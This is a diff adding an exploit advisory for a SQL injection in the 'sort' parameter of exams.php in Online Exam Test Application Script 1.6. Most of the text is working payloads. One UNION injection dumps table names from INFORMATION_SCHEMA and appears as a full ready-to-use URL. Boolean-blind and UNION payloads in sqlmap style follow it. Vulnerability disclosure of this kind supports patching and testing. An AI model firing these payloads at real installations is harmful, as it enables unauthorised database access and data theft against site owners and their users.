@@ -1,0 +1,37 @@
+# # # # # 
+# Exploit Title: Online Exam Test Application Script 1.6 - 'Exams.php 'sort' SQL Injection
+# Dork: N/A
+# Date: 08.12.2017
+# Vendor Homepage: https://www.phpscriptsmall.com/
+# Software Link: https://www.phpscriptsmall.com/product/online-exam-test-application/
+# Version: 1.6
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# 1)
+# http://localhost/[PATH]/exams.php?sort=[SQL]
+# 
+# -4++UNION+ALL+SELECT+1,2,3,(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%2b1,4,0x30),0x3a20,table_name,0x3c62723e))))x),5,6--+-
+# 
+# http://server/exams.php?sort=-4++UNION+ALL+SELECT+1,2,3,(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%2b1,4,0x30),0x3a20,table_name,0x3c62723e))))x),5,6--+-
+# 
+# Parameter: sort (GET)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: sort=4 AND 9300=9300
+# 
+#     Type: UNION query
+#     Title: Generic UNION query (NULL) - 6 columns
+#     Payload: sort=4 UNION ALL SELECT NULL,CONCAT(0x717a6b7071,0x436a5574724b7477565147546d496b47534c4e586c4275794c6359695374477874484b4669767978,0x7176627871),NULL,NULL,NULL,NULL-- Knya
+# 
+# # # # #
